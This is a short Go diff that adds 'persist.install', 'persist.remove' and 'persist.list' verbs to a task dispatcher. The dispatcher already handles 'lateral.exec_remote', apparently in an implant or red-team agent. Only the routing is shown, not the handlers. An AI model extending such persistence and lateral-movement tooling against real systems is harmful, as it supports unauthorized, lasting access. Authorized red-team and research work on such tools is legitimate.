@@ -95,6 +95,15 @@ func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.Ta
 	case "lateral.exec_remote":
 		outcome, output := r.lateralExecRemote(ctx, arguments)
 		return outcome, output, nil
+	case "persist.install":
+		outcome, output := r.persistInstall(ctx, arguments)
+		return outcome, output, nil
+	case "persist.remove":
+		outcome, output := r.persistRemove(ctx, arguments)
+		return outcome, output, nil
+	case "persist.list":
+		outcome, output := r.persistList(ctx, arguments)
+		return outcome, output, nil
 	default:
 		r.log.Printf("unknown verb: %s", verb)
 		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb, nil
